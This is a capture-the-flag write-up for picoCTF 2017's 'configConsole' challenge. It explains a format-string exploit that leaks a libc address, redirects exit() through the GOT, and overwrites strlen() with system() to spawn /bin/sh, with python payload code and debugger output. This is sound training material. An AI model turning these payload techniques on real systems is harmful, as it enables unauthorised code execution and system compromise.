# Level 3 - configConsole

```
Config Console
In order to configure the login messsage for all the users on the system, you've been given access to a configuration console. 
See if you can get a shell on shell2017.picoctf.com:47232.

HINTS

You can either see where libc is or modify the execution. 
Is there a way to get the vulnerability to run twice so that you can do both?
There's a place in libc that will give you a shell as soon as you jump to it. Try looking for execve.
```

The vulnerable piece of code is here:
```C
void set_exit_message(char *message) {
    if (!message) {
        printf("No message chosen\n");
        exit(1);
    }
    printf("Exit message set!\n");
    printf(message);   //<---------------------------HERE

    append_command('e', message);
    exit(0);
}
```
This is obviously a FSB. But there is a call to exit(0) right afterwards, so how can we get around this?

I did this by leaking a libc address and updating the GOT entry for exit() in one statement:
```python
  # Set the exit message, since that has the vulnerable printf()
  # First print out a leaked address to use. Then update write to GOT
  # to update the lower 2Bytes of the exit() address with something 
  # that doesn't do anything. Thereby just returning instead of exiting
  payload = 'e'
  payload += '_______'
  payload += p64(0x4141414141414141)
  payload += ' %25$p%{}c%19$hn '.format(int(0xb45-14))
  payload += 'AAAAA'
  payload += p64(0x601258)
  print r.sendline(payload)
```
We need to use the libc leak to find the base LIBC address.

The pointer on the stack that points to libc at stack location 19:
```asm
Break at *set_exit_message+61
pwndbg> telescope 48
00:0000│ rsp    0x7ffeaa6ed7b0 ◂— 0x0
01:0008│        0x7ffeaa6ed7b8 —▸ 0x7ffeaa6ed801 ◂— 0x3832257024353225 ('%25$p%28')
02:0010│ rbp    0x7ffeaa6ed7c0 —▸ 0x7ffeaa6edc00 —▸ 0x7ffeaa6edc20 ◂— 0x0
03:0018│        0x7ffeaa6ed7c8 —▸ 0x400aa6 (loop+233) ◂— jmp    0x400ace
04:0020│        0x7ffeaa6ed7d0 —▸ 0x7ffeaa6ed900 —▸ 0x7fe6650dbc58 ◂— pop    rsi
05:0028│        0x7ffeaa6ed7d8 —▸ 0x7ffeaa6ed7f0 ◂— 0x5f5f5f5f5f5f5f65 ('e_______')
... ↓
07:0038│        0x7ffeaa6ed7e8 —▸ 0x7ffeaa6ed801 ◂— 0x3832257024353225 ('%25$p%28')
08:0040│        0x7ffeaa6ed7f0 ◂— 0x5f5f5f5f5f5f5f65 ('e_______')
09:0048│        0x7ffeaa6ed7f8 ◂— u'AAAAAAAA'
0a:0050│ rdi-1  0x7ffeaa6ed800 ◂— 0x3225702435322500
0b:0058│        0x7ffeaa6ed808 ◂— 0x2439312563313738 ('871c%19$')
0c:0060│        0x7ffeaa6ed810 ◂— 0x4141414141206e68 ('hn AAAAA')
0d:0068│        0x7ffeaa6ed818 —▸ 0x601258 (exit@got.plt) —▸ 0x400736 (exit@plt+6) ◂— push   0xa /* u'h\n' */
0e:0070│        0x7ffeaa6ed820 ◂— 0x10000000a /* u'\n' */
0f:0078│        0x7ffeaa6ed828 ◂— 0x1000008a2
10:0080│        0x7ffeaa6ed830 ◂— 0x100010000
11:0088│        0x7ffeaa6ed838 —▸ 0x7fe665695db0 —▸ 0x7fe665476796 ◂— pop    r15 /* u'GLIBC_2.2.5' */
12:0090│        0x7ffeaa6ed840 —▸ 0x7ffeaa6ed990 ◂— 0x0
13:0098│        0x7ffeaa6ed848 —▸ 0x7fe66547ec1c (check_match+300) ◂— test   eax, eax
14:00a0│        0x7ffeaa6ed850 —▸ 0x7ffeaa6eda50 ◂— 0x0
15:00a8│        0x7ffeaa6ed858 ◂— 0x42a5a955
16:00b0│        0x7ffeaa6ed860 ◂— 0x2
17:00b8│        0x7ffeaa6ed868 ◂— 0x3
18:00c0│        0x7ffeaa6ed870 —▸ 0x7fe665695a68 —▸ 0x7fe6656981a8 ◂— 0x0
```
This is pointer we leaked `13:0098│        0x7ffeaa6ed848 —▸ 0x7fe66547ec1c (check_match+300) ◂— test   eax, eax`

Now we check the memory map:
```asm
pwndbg> vmmap 
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /home/code/code/pico2017/l3_configConsole/console
          0x601000           0x602000 rw-p     1000 1000   /home/code/code/pico2017/l3_configConsole/console
         0x1296000          0x12b7000 rw-p    21000 0      [heap]
    0x7fe6650cb000     0x7fe66526c000 r-xp   1a1000 0      /home/code/code/pico2017/l3_configConsole/libc.so.6.remote
    0x7fe66526c000     0x7fe66546c000 ---p   200000 1a1000 /home/code/code/pico2017/l3_configConsole/libc.so.6.remote
    0x7fe66546c000     0x7fe665470000 r--p     4000 1a1000 /home/code/code/pico2017/l3_configConsole/libc.so.6.remote
    0x7fe665470000     0x7fe665472000 rw-p     2000 1a5000 /home/code/code/pico2017/l3_configConsole/libc.so.6.remote
    0x7fe665472000     0x7fe665476000 rw-p     4000 0      
    0x7fe665476000     0x7fe665496000 r-xp    20000 0      /lib/x86_64-linux-gnu/ld-2.19.so
    0x7fe66568f000     0x7fe665696000 rw-p     7000 0      
    0x7fe665696000     0x7fe665697000 r--p     1000 20000  /lib/x86_64-linux-gnu/ld-2.19.so
    0x7fe665697000     0x7fe665698000 rw-p     1000 21000  /lib/x86_64-linux-gnu/ld-2.19.so
    0x7fe665698000     0x7fe665699000 rw-p     1000 0      
    0x7ffeaa6cd000     0x7ffeaa6ee000 rw-p    21000 0      [stack]
    0x7ffeaa7d0000     0x7ffeaa7d2000 r-xp     2000 0      [vdso]
    0x7ffeaa7d2000     0x7ffeaa7d4000 r--p     2000 0      [vvar]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```
Now it's simple math. `0x7fe66547ec1c - 0x7fe6650cb000 = 0x3b3c1c`. It should be noted that I ran the application on a Debian system as close to the server setup as possible and PRELOADED the remote version of LIBC so that I could test with the exact version used on the server. This gives us an offset that I can always use to substract from the leaked value and get the base libc value. 

Using the base libc value, we can use pwnlib builtin functionality to calculate the address of the `system()` function:
```python
  # Calculate libc base address
  r.recvuntil('0x')
  data = r.recvuntil(' ')
  leak = int(data,16)
  print hex(leak)
  libc_base = leak - LIBC_OFFSET
  print hex(libc_base)
  libc.address = libc_base
  print 'libc system: ' + hex(libc.symbols['system'])
  addr1 = libc.symbols['system'] & 0xFFFF
  addr2 = (libc.symbols['system'] >> 16) &0xFFFF
  addr3 = (libc.symbols['system'] >> 32) &0xFFFF
```

If we break at `b *set_exit_message+61` and investigate the memory values we see:

Before printf is called: `0x601258 (exit@got.plt) —▸ 0x400736 (exit@plt+6)`
After printf is called:  `0x601258 (exit@got.plt) —▸ 0x400b45 (main+114)`

So whenever exit() is called it will jump back into main+114 instead.

So now we have two things:
* Libc leaked address 
* Ability to do more calls to the vulnerable printf

The hint says that there is a place in libc that we can jump to that will give you a shell. 
That's nice and all, but is very libc binary specific and doesn't work for all libc libraries. 
Let's do it in a more robust way.

Next, we want to find a function that will take a pointer, preferably to a string we control.
```C
void set_prompt(char *prompt) {
    if (!prompt) {
        printf("No prompt chosen\n");
        exit(1);
    }
    if (strlen(prompt) > 10) {                //<------------ This looks perfect
        printf("Prompt too long\n");
        exit(1);
    }
    printf("Login prompt set to: %10s\n", prompt);

    append_command('p', prompt);
    exit(0);
}
```
Great, and `strlen()` is only used here, so we're safe to update that with multiple writes
```python
  #Start overwriting the GOT entry for strlen()
  #update it with the address of system()
  wait_for_prompt(r)
  payload  = 'e '
  payload += '%{}c%17$hn '.format(int(addr1))
  payload += 'A'*(8)
  payload += p64(0x601210)

  print r.sendline(payload)

  payload  = 'e '
  payload += '%{}c%18$hn '.format(int(addr2))
  payload += 'A'*(8+8)
  payload += p64(0x601210+2)

  print r.sendline(payload)

  payload  = 'e '
  payload += '%{}c%19$hn '.format(int(addr3))
  payload += 'A'*(8+8+8)
  payload += p64(0x601210+4)

  print r.sendline(payload)
```

Now at this point, if we look at the GOT entry for strlen() we have:
`0x601210 (strlen@got.plt) —▸ 0x7fb0701b3490 (system)`
Perfect. Now we just have to pass the right parameter to `system()`

```python
  # strlen() in GOT is now overwritten
  # since prompt calls strlen on string passed
  # we can input string directly here
  print r.sendline('p /bin/sh')
  print "You should now have shell"
  
  # Drop to interactive console
  r.interactive()
```

Full exploit code in the [exploit.py](exploit.py) file.
